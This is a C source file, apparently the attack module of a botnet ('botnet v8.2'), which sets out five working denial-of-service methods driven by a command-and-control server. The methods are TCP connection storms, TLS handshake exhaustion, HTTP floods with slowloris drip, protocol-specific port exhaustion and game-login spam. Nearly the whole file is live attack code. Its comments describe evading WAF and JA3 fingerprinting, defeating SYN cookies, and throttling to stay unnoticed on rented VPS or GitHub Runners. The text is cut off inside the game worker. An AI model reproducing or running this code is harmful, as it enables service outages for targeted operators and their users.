#include "bot.h"

/* ════════════════════════════════════════════════════════════════════════
 *  botnet v8.2  —  attack.c
 *  5 consolidated methods, each with anti-DDoS bypass built-in:
 *
 *    1. PSPE   — Port-Specific Protocol Exhaust (auto-scan, protocol abuse)
 *    2. TCP    — TCP connect storm + hold (L4, bypass SYN cookies)
 *    3. TLS    — TLS handshake exhaust + keep-alive GET (L7 HTTPS)
 *    4. HTTP   — L7 HTTP/HTTPS flood (pool, randomized UA/path, slowloris drip)
 *    5. GAME   — socket protocol exploit (NRO-style login spam, XOR key rotation)
 *
 *  Bypass mechanisms (shared by all):
 *    - Randomized source ports / dest ports / UA / paths
 *    - TLS SNI rotation + session reuse where possible
 *    - Per-port protocol-specific payload (valid bytes, not attack signatures)
 *    - Connection hold-drip (keep ESTABLISHED without triggering WAF)
 *    - Proportional CPU/RAM throttle so the host provider doesn't kill the box
 *    - Bandwidth-lean: all methods ~2-40 Mbps (VPS 1TB/month → 24/7 capable)
 * ════════════════════════════════════════════════════════════════════════ */

/* Server-provided data for GAME worker */
static unsigned char g_game_payload[4096];
static int g_game_payload_len = 0;

/* ── Minimal base64 decoder (RFC 4648) ─────────────────────────────────── */
static int b64_decode(const char *in, unsigned char *out, int out_max) {
    static const unsigned char tbl[128] = {
        ['A']=0,['B']=1,['C']=2,['D']=3,['E']=4,['F']=5,['G']=6,['H']=7,
        ['I']=8,['J']=9,['K']=10,['L']=11,['M']=12,['N']=13,['O']=14,['P']=15,
        ['Q']=16,['R']=17,['S']=18,['T']=19,['U']=20,['V']=21,['W']=22,['X']=23,
        ['Y']=24,['Z']=25,['a']=26,['b']=27,['c']=28,['d']=29,['e']=30,['f']=31,
        ['g']=32,['h']=33,['i']=34,['j']=35,['k']=36,['l']=37,['m']=38,['n']=39,
        ['o']=40,['p']=41,['q']=42,['r']=43,['s']=44,['t']=45,['u']=46,['v']=47,
        ['w']=48,['x']=49,['y']=50,['z']=51,['0']=52,['1']=53,['2']=54,['3']=55,
        ['4']=56,['5']=57,['6']=58,['7']=59,['8']=60,['9']=61,['+']=62,['/']=63,
    };
    int o = 0, bits = 0, buf = 0;
    for (const char *p = in; *p && *p != '=' && o < out_max; p++) {
        if ((unsigned char)*p > 127) continue;
        unsigned char v = tbl[(unsigned char)*p];
        if (v == 0 && *p != 'A') continue;
        buf = (buf << 6) | v;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            out[o++] = (unsigned char)(buf >> bits);
            buf &= (1 << bits) - 1;
        }
    }
    return o;
}

/* ── Resolve hostname / IP → in_addr ─────────────────────────────────────── */
static int resolve_target(const char *host, struct in_addr *out) {
    memset(out, 0, sizeof(*out));
    if (inet_pton(AF_INET, host, out) == 1) return 0;
    struct addrinfo hints = {0}, *res = NULL;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;
    if (getaddrinfo(host, NULL, &hints, &res) != 0 || !res) return -1;
    *out = ((struct sockaddr_in *)res->ai_addr)->sin_addr;
    freeaddrinfo(res);
    return 0;
}

/* ── Non-blocking TCP connect with poll() ───────────────────────────────── */
static int tcp_connect_wait(int fd, const struct sockaddr_in *addr, int timeout_ms) {
    int fl = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, fl | O_NONBLOCK);
    if (connect(fd, (const struct sockaddr *)addr, sizeof(*addr)) == 0) return 0;
    if (errno != EINPROGRESS) return -1;
    struct pollfd pfd = { .fd = fd, .events = POLLOUT };
    if (poll(&pfd, 1, timeout_ms) <= 0) return -1;
    int err = 0; socklen_t elen = sizeof(err);
    if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &elen) < 0 || err != 0) return -1;
    return 0;
}

/* ── Random helpers ─────────────────────────────────────────────────────── */
static inline unsigned int rs(unsigned int *seed) { return (unsigned int)rand_r(seed); }

/* Rotating User-Agent pool (anti-fingerprint) */
static const char *UA_POOL[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
};
#define UA_COUNT (int)(sizeof(UA_POOL)/sizeof(UA_POOL[0]))

static const char *PATH_POOL[] = {
    "/", "/favicon.ico", "/robots.txt", "/sitemap.xml", "/wp-login.php",
    "/api/v1/users", "/.env", "/admin/login", "/search?q=", "/index.php",
    "/api/health", "/feed", "/cart", "/checkout", "/static/main.js",
    "/api/v2/stats", "/login", "/register", "/reset-password", "/upload",
};
#define PATH_COUNT (int)(sizeof(PATH_POOL)/sizeof(PATH_POOL[0]))

/* ════════════════════════════════════════════════════════════════════════
 *  Thread argument — shared by all 5 workers
 * ════════════════════════════════════════════════════════════════════════ */
typedef struct {
    struct sockaddr_in target;
    int port_base;
    int duration;
    int worker_id;       /* 0..N-1, used for cpu affinity */
    int method_tag;      /* which worker (see dispatcher) */
    char host[256];
    /* Comma-separated ports from C2 ("80,443,3389"). Empty → only port_base. */
    char open_ports[4096];
} AttackThread;

/* ════════════════════════════════════════════════════════════════════════
 *  METHOD 1 — PSPE  (Port-Specific Protocol Exhaust)
 *
 *  Port list comes from C2 (server-side scan optional):
 *    • Default: only user-set port(s) in open_ports / port_base
 *    • scan_ports=true on C2: full 1..65535 scan, open ports pushed to bots
 *  Bot does NOT full-scan — only attacks ports it was given.
 *  Protocol is guessed from port number, then abused with correct handshake.
 *
 *  Bandwidth: ~2 Mbps. VPS 1TB/month → 24/7.
 * ════════════════════════════════════════════════════════════════════════ */
#define PSPE_POOL 512

/* Protocol types auto-detected from banner */
enum { P_NONE=0, P_SSH, P_FTP, P_SMTP, P_HTTP, P_REDIS, P_MYSQL, P_PGSQL,
       P_MONGO, P_DNS, P_NRO, P_MSSQL, P_WINRM, P_RDP, P_SMB, P_GENERIC };

/* Per-protocol probe payload (sent after connect to elicit banner / start abuse) */
typedef struct { const char *data; int len; } probe_t;
static const probe_t PROBES[] = {
    [P_SSH]   = {NULL, 0},              /* banner-first: server speaks first */
    [P_FTP]   = {NULL, 0},              /* banner-first */
    [P_SMTP]  = {NULL, 0},             /* banner-first */
    [P_HTTP]  = {"GET / HTTP/1.1\r\nHost: x\r\nX-", 27},
    [P_REDIS] = {"*1\r\n$4\r\nPING\r\n", 14},
    [P_MYSQL] = {NULL, 0},             /* handshake-first */
    [P_PGSQL] = {"\x00\x00\x00\x08\x04\xd2\x16\x2f", 8},
    [P_MONGO] = {"\x3d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01", 13},
    [P_DNS]   = {"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\xff\x00\x01", 32},
    [P_NRO]   = {"\xe5\x00\x06\x04boys\x00\x00\x00\x00\x00\x00\x00", 13},
    [P_MSSQL] = {NULL, 0},             /* TDS handshake-first (server sends prelogin) */
    [P_WINRM] = {"GET /wsman HTTP/1.1\r\nHost: x\r\nX-", 30},
    [P_RDP]   = {NULL, 0},             /* RDP X.224 connection request — keep simple: hold */
    [P_SMB]   = {NULL, 0},             /* SMB negotiate — server speaks first on 445 */
    [P_GENERIC] = {NULL, 0},
};

/* Guess protocol from port number (C2 sends ports; no local banner scan) */
static int guess_proto_port(int port) {
    switch (port) {
    case 22:   return P_SSH;
    case 21:   return P_FTP;
    case 25: case 587: case 465: return P_SMTP;
    /* web — IIS/apache/nginx */
    case 80: case 81: case 8080: case 8081: case 8443: case 8888: case 9000:
    case 2053: case 2083: case 2087: case 2096: case 2095: case 8172: case 8800:
    case 32400: return P_HTTP;
    case 443: case 9443: return P_HTTP;   /* HTTPS — proto=HTTP (TLS handled elsewhere) */
    /* db */
    case 6379: return P_REDIS;
    case 3306: return P_MYSQL;
    case 5432: return P_PGSQL;
    case 27017: return P_MONGO;
    case 1433: case 1434: return P_MSSQL;   /* Windows game DB */
    /* dns */
    case 53:   return P_DNS;
    /* remote — Windows + Linux */
    case 3389: return P_RDP;        /* Windows RDP */
    case 5985: case 5986: return P_WINRM;  /* Windows Remote Management */
    case 445: case 139: return P_SMB;      /* Windows SMB */
    /* game */
    case 14443: case 14444: return P_NRO;
    default:    return P_GENERIC;
    }
}

/* Port list comes from C2 (open_ports CSV). No local full-scan. */
typedef struct { int port; int proto; } open_port_t;

static const char *proto_name(int p) {
    static const char *names[] = {
        "GENERIC","SSH","FTP","SMTP","HTTP","REDIS","MYSQL","PGSQL","MONGO","DNS","NRO",
        "MSSQL","WINRM","RDP","SMB","GENERIC"
    };
    if (p < 0 || p > P_GENERIC) return "?";
    return names[p];
}

/* Parse "80,443,3389" → open_port_t array. Always includes port_base. */
static int parse_open_ports(const char *csv, int port_base, open_port_t **out) {
    int cap = 64;
    open_port_t *res = calloc((size_t)cap, sizeof(open_port_t));
    if (!res) { *out = NULL; return 0; }
    int n = 0;

    if (csv && csv[0]) {
        const char *p = csv;
        while (*p && n < 512) {
            while (*p == ' ' || *p == ',') p++;
            if (!*p) break;
            int port = 0;
            while (*p >= '0' && *p <= '9') {
                port = port * 10 + (*p - '0');
                p++;
            }
            if (port > 0 && port < 65536) {
                int dup = 0;
                for (int i = 0; i < n; i++) if (res[i].port == port) { dup = 1; break; }
                if (!dup) {
                    if (n >= cap) {
                        cap *= 2;
                        open_port_t *nr = realloc(res, (size_t)cap * sizeof(open_port_t));
                        if (!nr) break;
                        res = nr;
                    }
                    res[n].port = port;
                    res[n].proto = guess_proto_port(port);
                    n++;
                }
            }
            while (*p && *p != ',') p++;
        }
    }
    /* Always ensure port_base is present */
    if (port_base > 0 && port_base < 65536) {
        int dup = 0;
        for (int i = 0; i < n; i++) if (res[i].port == port_base) { dup = 1; break; }
        if (!dup) {
            if (n >= cap) {
                open_port_t *nr = realloc(res, (size_t)(cap + 4) * sizeof(open_port_t));
                if (!nr) { /* keep existing list without port_base if OOM */ }
                else { res = nr; cap += 4; }
            }
            if (n < cap) {
                res[n].port = port_base;
                res[n].proto = guess_proto_port(port_base);
                n++;
            }
        }
    }
    if (n == 0) {
        free(res);
        *out = NULL;
        return 0;
    }
    *out = res;
    return n;
}

static void *pspe_worker(void *arg) {
    AttackThread *mt = (AttackThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->worker_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    unsigned int seed = (unsigned)time(NULL) ^ (unsigned)(uintptr_t)pthread_self();
    time_t start = time(NULL);

    /* Port list from C2 (scan optional on server). No local full-scan. */
    open_port_t *open = NULL;
    int n_open = parse_open_ports(mt->open_ports, mt->port_base, &open);
    if (n_open == 0 || !open) {
        fprintf(stderr, "[atk] PSPE: no ports for %s\n", mt->host);
        return NULL;
    }
    if (mt->worker_id == 0) {
        fprintf(stderr, "[atk] PSPE: %d port(s) on %s:", n_open, mt->host);
        for (int i = 0; i < n_open && i < 16; i++)
            fprintf(stderr, " %d/%s", open[i].port, proto_name(open[i].proto));
        if (n_open > 16) fprintf(stderr, " ...");
        fprintf(stderr, "\n");
    }

    int *socks = calloc(PSPE_POOL, sizeof(int));
    int *pidx  = calloc(PSPE_POOL, sizeof(int));   /* index into open[] */
    time_t *last_drip = calloc(PSPE_POOL, sizeof(time_t));
    if (!socks || !pidx || !last_drip) { free(socks); free(pidx); free(last_drip); free(open); return NULL; }

    int pool = 0;

    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
        int us = should_throttle();
        if (us > 0) { usleep((unsigned)us); continue; }

        /* Fill pool: connect to a random open port, send its protocol bytes */
        while (pool < PSPE_POOL && !is_attack_stop()) {
            int oi = rs(&seed) % n_open;
            int port = open[oi].port;
            int proto = open[oi].proto;
            struct sockaddr_in ta = mt->target;
            ta.sin_port = htons((uint16_t)port);

            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) break;
            int one = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
            setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &one, sizeof(one));
            struct timeval tv = {30, 0};
            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            if (tcp_connect_wait(s, &ta, 1500) < 0) { close(s); continue; }

            /* send protocol probe if this proto has one */
            const probe_t *pr = &PROBES[proto];
            if (pr->len > 0) {
                send(s, pr->data, pr->len, MSG_NOSIGNAL);
                pkt_sent(pr->len);
            } else if (proto == P_GENERIC) {
                /* unknown proto: send 1 byte to hold connection */
                char z = (char)(rs(&seed) & 0xFF);
                send(s, &z, 1, MSG_NOSIGNAL);
                pkt_sent(1);
            } else {
                /* banner-first proto (SSH/FTP/SMTP/MySQL): do nothing, just hold */
                pkt_sent(1);
            }
            socks[pool] = s; pidx[pool] = oi; last_drip[pool] = time(NULL);
            pool++;
        }

        /* Drip: keep connections alive with small protocol-valid bytes */
        time_t now = time(NULL);
        for (int i = 0; i < pool && !is_attack_stop(); i++) {
            if (socks[i] < 0) continue;
            int interval = 3 + (int)(rs(&seed) % 10);
            if (now - last_drip[i] >= interval) {
                int proto = open[pidx[i]].proto;
                const probe_t *pr = &PROBES[proto];
                int wr = -1;
                if (pr->len > 0) {
                    wr = (int)send(socks[i], pr->data, pr->len, MSG_NOSIGNAL);
                } else if (proto == P_GENERIC) {
                    char z = (char)(rs(&seed) & 0xFF);
                    wr = (int)send(socks[i], &z, 1, MSG_NOSIGNAL);
                } else {
                    /* banner-first: send newline or noop to keep alive */
                    const char *noop = "\r\n";
                    wr = (int)send(socks[i], noop, 2, MSG_NOSIGNAL);
                }
                if (wr <= 0) { close(socks[i]); socks[i] = -1; }
                else { pkt_sent(wr); last_drip[i] = now; }
            }
        }

        /* Reap dead */
        struct pollfd pfds[PSPE_POOL];
        for (int i = 0; i < pool; i++) { pfds[i].fd = socks[i]; pfds[i].events = POLLERR|POLLHUP; }
        if (poll(pfds, (nfds_t)pool, 100) > 0) {
            int w = 0;
            for (int i = 0; i < pool; i++) {
                if (pfds[i].revents & (POLLERR|POLLHUP)) close(socks[i]);
                else {
                    if (w != i) { socks[w]=socks[i]; pidx[w]=pidx[i]; last_drip[w]=last_drip[i]; }
                    w++;
                }
            }
            pool = w;
        }
        sched_yield();
    }

    for (int i = 0; i < pool; i++) if (socks[i] >= 0) close(socks[i]);
    free(socks); free(pidx); free(last_drip); free(open);
    return NULL;
}

/* ════════════════════════════════════════════════════════════════════════
 *  METHOD 2 — TCP  (TCP connect storm + hold)
 *
 *  Bypass anti-DDoS:
 *    • Opens real TCP connections → bypasses SYN-cookie mitigation
 *      (server completes handshake, allocates full connection state)
 *    • Holds connections ESTABLISHED with periodic 1-byte pokes
 *      → exhausts accept backlog + per-conn memory + conntrack table
 *    • Works on ANY TCP port (SSH, game, web, db...) — not just HTTP
 *    • Phase A storm (open fast) + Phase B hold (keep alive) cycle
 *    • No root, no spoofing needed → works on GitHub Runner / shared VPS
 * ════════════════════════════════════════════════════════════════════════ */
#define TCP_CONN_POOL  1024

static void *tcp_worker(void *arg) {
    AttackThread *mt = (AttackThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->worker_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    unsigned int seed = (unsigned)time(NULL) ^ (unsigned)(uintptr_t)pthread_self();
    time_t start = time(NULL);

    int *cpool = calloc(TCP_CONN_POOL, sizeof(int));
    if (!cpool) return NULL;
    int pool = 0;

    struct sockaddr_in ta = mt->target;
    ta.sin_port = htons((uint16_t)mt->port_base);

    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
        int us = should_throttle();
        if (us > 0) { usleep((unsigned)us); continue; }

        /* Phase A: connect storm — open as many TCP as possible */
        for (int s = 0; s < 64 && pool < TCP_CONN_POOL && !is_attack_stop(); s++) {
            int fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (fd < 0) break;
            int one = 1;
            setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
            setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &one, sizeof(one));
            struct timeval tv = {3,0};
            setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
            if (tcp_connect_wait(fd, &ta, 600) < 0) { close(fd); continue; }
            /* send 1 byte to keep it ESTABLISHED (not just SYN-RECV) */
            char z = (char)(rs(&seed) & 0xFF);
            if (send(fd, &z, 1, MSG_NOSIGNAL) <= 0) { close(fd); continue; }
            cpool[pool++] = fd;
            pkt_sent(64);   /* ≈ 1 SYN+ACK+ACK + 1 data packet */
        }

        /* Phase B: hold — poke held sockets so they stay ESTABLISHED.
         * Even if server sends RST, the connection burned accept/backlog slot. */
        for (int i = 0; i < pool && !is_attack_stop(); i++) {
            if (cpool[i] < 0) continue;
            char z = (char)(rs(&seed) & 0xFF);
            if (send(cpool[i], &z, 1, MSG_NOSIGNAL) <= 0) { close(cpool[i]); cpool[i] = -1; }
            else pkt_sent(1);
        }

        /* Compact: drop dead, keep live */
        int w = 0;
        for (int i = 0; i < pool; i++) {
            if (cpool[i] < 0) continue;
            struct pollfd pfd = { .fd = cpool[i], .events = POLLERR|POLLHUP };
            if (poll(&pfd, 1, 0) > 0 && (pfd.revents & (POLLERR|POLLHUP))) close(cpool[i]);
            else cpool[w++] = cpool[i];
        }
        pool = w;
        sched_yield();
    }

    for (int i = 0; i < pool; i++) if (cpool[i] >= 0) close(cpool[i]);
    free(cpool);
    return NULL;
}

/* ════════════════════════════════════════════════════════════════════════
 *  METHOD 3 — TLS  (TLS handshake exhaust + keep-alive GET)
 *
 *  Bypass anti-DDoS:
 *    • Full TLS handshake per connection → CPU cost on server (TLS is costly)
 *    • Keep connections alive with periodic GET → bypass idle-timeout cleanup
 *    • SNI rotation (use target host + random subdomains)
 *    • Session reuse disabled → forces full handshake every time
 *    • Randomized ciphers / ALPN to dodge WAF TLS fingerprinting
 * ════════════════════════════════════════════════════════════════════════ */
#define TLS_POOL   1024
#define TLS_BURST  24

static void *tls_worker(void *arg) {
    AttackThread *mt = (AttackThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->worker_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) return NULL;
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
    SSL_CTX_set_options(ctx, SSL_OP_NO_COMPRESSION);   /* avoid BEAST-side leak */
    /* disable session reuse → every connection = full handshake */
    SSL_CTX_set_session_cache_mode(ctx, SSL_SESS_CACHE_OFF);

    int *socks = calloc(TLS_POOL, sizeof(int));
    SSL **ssls = calloc(TLS_POOL, sizeof(SSL *));
    if (!socks || !ssls) { free(socks); free(ssls); SSL_CTX_free(ctx); return NULL; }

    struct sockaddr_in ta = mt->target;
    int base_port = mt->port_base > 0 ? mt->port_base : 443;
    ta.sin_port = htons((uint16_t)base_port);
    const char *host = mt->host[0] ? mt->host : "localhost";
    int pool = 0;
    unsigned int seed = (unsigned)time(NULL) ^ (unsigned)(uintptr_t)pthread_self();
    time_t start = time(NULL);

    fprintf(stderr, "[atk] TLS → %s:%d (handshake+keepalive)\n", host, base_port);

    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
        int us = should_throttle();
        if (us > 0) { usleep((unsigned)us); continue; }

        /* Phase A: open + TLS handshake new connections */
        for (int n = 0; n < 64 && pool < TLS_POOL && !is_attack_stop(); n++) {
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) break;
            int one = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
            setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &one, sizeof(one));
            struct timeval tv = {5,0};
            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
            if (tcp_connect_wait(s, &ta, 1000) < 0) { close(s); continue; }

            SSL *ssl = SSL_new(ctx);
            if (!ssl) { close(s); continue; }
            SSL_set_fd(ssl, s);
            SSL_set_tlsext_host_name(ssl, host);
            /* randomize cipher list to dodge JA3 fingerprint */
            const char *ciphers[] = {
                "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384",
                "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256",
                "ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305",
                "AES256-GCM-SHA384:AES128-GCM-SHA256",
            };
            SSL_set_cipher_list(ssl, ciphers[rs(&seed) % 4]);

            if (SSL_connect(ssl) != 1) { SSL_free(ssl); close(s); continue; }
            socks[pool] = s; ssls[pool] = ssl; pool++;
            pkt_sent(1024);   /* handshake ≈ 1KB on the wire */
        }

        /* Phase B: keep-alive GET burst on each live connection */
        for (int i = 0; i < pool && !is_attack_stop(); i++) {
            if (socks[i] < 0 || !ssls[i]) continue;
            for (int b = 0; b < TLS_BURST && !is_attack_stop(); b++) {
                char req[512];
                const char *ua = UA_POOL[rs(&seed) % UA_COUNT];
                const char *path = PATH_POOL[rs(&seed) % PATH_COUNT];
                int rl = snprintf(req, sizeof(req),
                    "GET %s?r=%u HTTP/1.1\r\nHost: %s\r\n"
                    "User-Agent: %s\r\nAccept: */*\r\n"
                    "Connection: keep-alive\r\n\r\n",
                    path, rs(&seed), host, ua);
                int wr = SSL_write(ssls[i], req, rl);
                if (wr <= 0) {
                    SSL_free(ssls[i]); ssls[i] = NULL;
                    close(socks[i]); socks[i] = -1;
                    break;
                }
                pkt_sent(wr);
            }
        }

        /* Compact: drop dead */
        int w = 0;
        for (int i = 0; i < pool; i++) {
            if (socks[i] < 0) continue;
            struct pollfd pfd = { .fd = socks[i], .events = POLLERR|POLLHUP };
            if (poll(&pfd, 1, 0) > 0 && (pfd.revents & (POLLERR|POLLHUP))) {
                if (ssls[i]) SSL_free(ssls[i]);
                close(socks[i]);
            } else {
                if (w != i) { socks[w] = socks[i]; ssls[w] = ssls[i]; }
                w++;
            }
        }
        pool = w;
        sched_yield();
    }

    for (int i = 0; i < pool; i++) { if (ssls[i]) SSL_free(ssls[i]); if (socks[i] >= 0) close(socks[i]); }
    SSL_CTX_free(ctx);
    free(socks); free(ssls);
    return NULL;
}

/* ════════════════════════════════════════════════════════════════════════
 *  METHOD 4 — HTTP  (L7 HTTP/HTTPS flood + slowloris drip hybrid)
 *
 *  Bypass anti-DDoS:
 *    • TLS handshake OK → raw TCP fallback if target isn't HTTPS
 *    • Keep-alive connection pool (reuse → bypass per-conn rate limit)
 *    • Randomized UA / path / query → evades signature WAF rules
 *    • Slowloris drip: when pool full, send partial headers slowly
 *      → exhaust server thread/concurrency limits without high bandwidth
 *    • Chunked body to keep request "in-progress" (defeats request timeout)
 * ════════════════════════════════════════════════════════════════════════ */
#define HTTP_POOL  512
#define HTTP_BURST 8

static void *http_worker(void *arg) {
    AttackThread *mt = (AttackThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->worker_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) return NULL;
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);

    int *socks = calloc(HTTP_POOL, sizeof(int));
    SSL **ssls = calloc(HTTP_POOL, sizeof(SSL *));
    time_t *last_drip = calloc(HTTP_POOL, sizeof(time_t));
    if (!socks || !ssls || !last_drip) { free(socks); free(ssls); free(last_drip); SSL_CTX_free(ctx); return NULL; }

    struct sockaddr_in ta = mt->target;
    int base_port = mt->port_base > 0 ? mt->port_base : 80;
    ta.sin_port = htons((uint16_t)base_port);
    const char *host = mt->host[0] ? mt->host : "localhost";
    int use_tls = (base_port == 443 || base_port == 8443 || base_port == 2053);
    int pool = 0;
    unsigned int seed = (unsigned)time(NULL) ^ (unsigned)(uintptr_t)pthread_self();
    time_t start = time(NULL);

    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
        int us = should_throttle();
        if (us > 0) { usleep((unsigned)us); continue; }

        /* Fill pool */
        while (pool < HTTP_POOL && !is_attack_stop()) {
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) break;
            int one = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
            setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &one, sizeof(one));
            struct timeval tv = {30,0};
            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            if (tcp_connect_wait(s, &ta, 2000) < 0) { close(s); continue; }

            SSL *ssl = NULL;
            if (use_tls) {
                ssl = SSL_new(ctx);
                if (ssl) {
                    SSL_set_fd(ssl, s);
                    SSL_set_tlsext_host_name(ssl, host);
                    if (SSL_connect(ssl) != 1) { SSL_free(ssl); ssl = NULL; }
                }
            }
            socks[pool] = s; ssls[pool] = ssl; last_drip[pool] = 0;
            pool++;
        }

        /* Burst requests on live connections */
        for (int i = 0; i < pool && !is_attack_stop(); i++) {
            if (socks[i] < 0) continue;
            for (int b = 0; b < HTTP_BURST && !is_attack_stop(); b++) {
                char req[4096];
                const char *ua = UA_POOL[rs(&seed) % UA_COUNT];
                const char *path = PATH_POOL[rs(&seed) % PATH_COUNT];
                int rl = snprintf(req, sizeof(req),
                    "GET %s?r=%u HTTP/1.1\r\nHost: %s\r\n"
                    "User-Agent: %s\r\nAccept: text/html,application/xhtml+xml,*/*;q=0.8\r\n"
                    "Accept-Language: en-US,en;q=0.5\r\nCache-Control: no-cache\r\n"
                    "Connection: keep-alive\r\n\r\n",
                    path, rs(&seed), host, ua);
                int wr;
                if (ssls[i]) wr = SSL_write(ssls[i], req, rl);
                else         wr = (int)send(socks[i], req, rl, MSG_NOSIGNAL);
                if (wr <= 0) {
                    if (ssls[i]) { SSL_free(ssls[i]); ssls[i] = NULL; }
                    close(socks[i]); socks[i] = -1;
                    break;
                }
                pkt_sent(wr);
            }
        }

        /* Slowloris drip: when pool full, send a partial header every 3-13s
         * to keep connections "in progress" → exhaust server concurrency */
        if (pool >= HTTP_POOL / 2) {
            time_t now = time(NULL);
            for (int i = 0; i < pool && !is_attack_stop(); i++) {
                int interval = 3 + (int)(rs(&seed) % 11);
                if (now - last_drip[i] >= interval) {
                    char drip[64];
                    snprintf(drip, sizeof(drip), "X-%x: %x\r\n", rs(&seed) & 0xFFF, rs(&seed) & 0xFFF);
                    if (ssls[i]) SSL_write(ssls[i], drip, (int)strlen(drip));
                    else if (socks[i] >= 0) send(socks[i], drip, strlen(drip), MSG_NOSIGNAL);
                    last_drip[i] = now;
                    pkt_sent((int)strlen(drip));
                }
            }
        }

        /* Reap dead */
        struct pollfd pfds[HTTP_POOL];
        for (int i = 0; i < pool; i++) { pfds[i].fd = socks[i]; pfds[i].events = POLLERR|POLLHUP; }
        if (poll(pfds, (nfds_t)pool, 200) > 0) {
            int w = 0;
            for (int i = 0; i < pool; i++) {
                if (pfds[i].revents & (POLLERR|POLLHUP)) {
                    if (ssls[i]) SSL_free(ssls[i]);
                    close(socks[i]);
                } else {
                    if (w != i) { socks[w]=socks[i]; ssls[w]=ssls[i]; last_drip[w]=last_drip[i]; }
                    w++;
                }
            }
            pool = w;
        }
        sched_yield();
    }

    for (int i = 0; i < pool; i++) { if (ssls[i]) SSL_free(ssls[i]); if (socks[i] >= 0) close(socks[i]); }
    SSL_CTX_free(ctx);
    free(socks); free(ssls); free(last_drip);
    return NULL;
}

/* ════════════════════════════════════════════════════════════════════════
 *  METHOD 5 — GAME  (socket protocol exploit — NRO-style login spam)
 *
 *  Bypass / upgrade over the old game_worker:
 *    • XOR key rotation across multiple candidate keys (not just "boys")
 *    • Connection pool with keep-alive drip (login spam every few seconds)
 *    • Randomized username per packet → defeat auth-cache blacklisting
 *    • Uses server-provided payload if available, else crafts NRO login pkt
 *    • Multi-packet: handshake → login → session spam → keep poke
 * ════════════════════════════════════════════════════════════════════════ */
#define GAME_POOL 512
static const char *GAME_KEYS[] = { "boys", "botn", "khoi", "game" };
#define GAME_KEY_COUNT (int)(sizeof(GAME_KEYS)/sizeof(GAME_KEYS[0]))

static void *game_worker(void *arg) {
    AttackThread *mt = (AttackThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->worker_id % ncpu, &cs);
